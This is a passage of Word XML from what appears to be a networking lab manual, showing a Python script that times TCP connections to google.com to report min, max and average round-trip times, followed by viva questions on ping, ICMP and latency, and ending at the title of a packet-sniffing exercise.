    <w:p w14:paraId="18205EB2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"Reply from {host}: time={(end-start)*1000:.2f} ms")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CDD93B4" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    except Exception:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B782D57" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        print("Request timed out")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C705159" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Output:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68946652" w14:textId="5BC5FFB2" w:rsidR="007A08A6" w:rsidRDefault="004D5A4D" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="004D5A4D">
        <w:rPr>
          <w:rFonts w:ascii="Aptos" w:eastAsia="Aptos" w:hAnsi="Aptos" w:cs="Cordia New"/>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="th-TH"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="55EF37D0" wp14:editId="553D12D5">
            <wp:extent cx="5731510" cy="1945640"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="8778481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48134" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId30"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="1945640"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BEDAF01" w14:textId="49F6A036" w:rsidR="0094061E" w:rsidRDefault="0094061E" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50953887" w14:textId="77777777" w:rsidR="00B44971" w:rsidRDefault="00000000" w:rsidP="007A08A6">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="53252804" w14:textId="77777777" w:rsidR="00B44971" w:rsidRDefault="00B44971" w:rsidP="00B44971">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">              </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B8E267" w14:textId="374D493B" w:rsidR="0094061E" w:rsidRDefault="00B44971" w:rsidP="00B44971">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">              </w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Program Code:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70D23DB7" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Customized Ping Program to Measure Min, Max, and Average RTT:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C968D71" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import socket, time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46BCFA8C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>host = "google.com"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AE4A62C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>port = 80</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10C7D39C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>count = 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0DB12E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>times = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="715323AD" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>for i in range(count):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D8C8841" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3353E860" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        s = socket.socket()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35067EA5" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        start = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55355CA0" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        s.connect((host, port))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B2F5A69" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        end = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62AC6AC0" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        s.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B88244A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        rtt = (end - start) * 1000</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00E4EAE0" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        times.append(rtt)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69134B7E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"Reply from {host}: time={rtt:.2f} ms")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="244422DA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    except:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F9D0B9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        print("Request timed out")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EC926A4" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>if times:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65DC4ED2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("\nMin RTT =", min(times), "ms")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FC8C80C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("Max RTT =", max(times), "ms")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64AF5491" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("Avg RTT =", sum(times)/len(times), "ms")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="354C2135" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A1A6D8D" w14:textId="77777777" w:rsidR="00B44971" w:rsidRDefault="00B44971" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44A2C2A0" w14:textId="48FFD851" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Output:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33113BD5" w14:textId="29208047" w:rsidR="0094061E" w:rsidRDefault="000F5866" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="000F5866">
        <w:rPr>
          <w:rFonts w:ascii="Aptos" w:eastAsia="Aptos" w:hAnsi="Aptos" w:cs="Cordia New"/>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="th-TH"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5EE5DC2D" wp14:editId="333C8B45">
            <wp:extent cx="5731510" cy="2316480"/>
            <wp:effectExtent l="0" t="0" r="2540" b="7620"/>
            <wp:docPr id="149673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73946" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId31"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="2316480"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D465C24" w14:textId="77777777" w:rsidR="00772C5E" w:rsidRDefault="00772C5E" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37312DB3" w14:textId="56A2C402" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Result:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74B30544" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Thus the server connectivity is tested using ping command.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12DDE85C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="69020D68" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6627BF33" w14:textId="5AD2EE05" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Viva Questions </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DDF070F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. What is the purpose of the ping command?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="101E83C6" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:The ping command is used to check whether a host or server is reachable over a network and to measure the response time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB1F4AE" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. Which protocol is used by the ping command?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F04A86E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:Ping uses the Internet Control Message Protocol (ICMP), specifically ICMP Echo Request and Echo Reply messages.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60BE491E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. What is an ICMP Echo Request?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F07F6D6" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:An ICMP Echo Request is a message sent by a computer to another device to check whether it is active and reachable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F956201" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. What is meant by latency in a ping operation?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50DDC0B7" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:Latency is the time taken for a packet to travel from the source to the destination and back, usually measured in milliseconds (ms).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66370C29" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. What does packet loss indicate in a ping test?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68DA7F5F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:Packet loss indicates that some packets failed to reach the destination or return to the sender, which may be due to network congestion or failures.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215550BB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5819770F" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6106DB04" w14:textId="0EC93596" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Ex.No:4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F0D146C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="000F5866">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>PACKET SNIFFING USING RAW SOCKETS IN PYTHON</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D569A0" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
